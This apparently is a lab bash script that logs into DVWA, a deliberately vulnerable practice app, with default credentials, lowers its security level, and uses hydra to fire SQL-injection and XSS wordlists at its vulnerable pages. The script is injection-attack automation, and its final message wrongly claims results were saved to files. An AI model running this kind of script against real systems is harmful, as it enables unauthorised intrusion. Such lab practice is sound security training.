#!/bin/bash

TARGET="192.168.122.109"
BASE_URL="http://$TARGET/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
SQL_WORDLIST="SQL-Injection-Wordlist.txt"
XSS_WORDLIST="XSS-Wordlist.txt"
COOKIE_FILE="dvwa_cookies.txt"

echo "[*] Target: $BASE_URL"
echo "[*] Preparing environment..."

INIT_PAGE=$(curl -s -c $COOKIE_FILE "$BASE_URL/login.php")
USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')

if [ -z "$USER_TOKEN" ]; then
    echo "[!] Warning: CSRF token not found, attempting login anyway..."
else
    echo "[+] Got CSRF Token: $USER_TOKEN"
fi

echo "[*] Attempting Login..."
curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
     -d "username=$DVWA_USER&password=$DVWA_PASS&user_token=$USER_TOKEN&Login=Login" \
     "$BASE_URL/login.php" > /dev/null

echo "[*] Setting security level to LOW..."
curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
     -d "security=low&secur_set=Submit" \
     "$BASE_URL/security.php" > /dev/null

SESSION_ID=$(grep "PHPSESSID" $COOKIE_FILE | awk '{print $7}')

if [ -z "$SESSION_ID" ]; then
    echo "[!] Login failed. Please check credentials."
    exit 1
fi

echo "[+] Authentication Successful! PHPSESSID: $SESSION_ID"

echo "[*] Starting SQL Injection Attack..."
hydra -l "$DVWA_USER" -P "$SQL_WORDLIST" "$TARGET" http-get-form \
      "/DVWA/vulnerabilities/sqli/:id=^PASS^&Submit=Submit:F=ID doesn't exist" \
      -m "H=Cookie: security=low; PHPSESSID=$SESSION_ID" -V

echo "[*] Starting XSS Attack..."
hydra -l "$DVWA_USER" -P "$XSS_WORDLIST" "$TARGET" http-get-form \
      "/DVWA/vulnerabilities/xss_r/:name=^PASS^:S=Hello" \
      -m "H=Cookie: security=low; PHPSESSID=$SESSION_ID" -V

echo "[*] Process complete. Results saved in sql_results.txt and xss_results.txt"

rm $COOKIE_FILE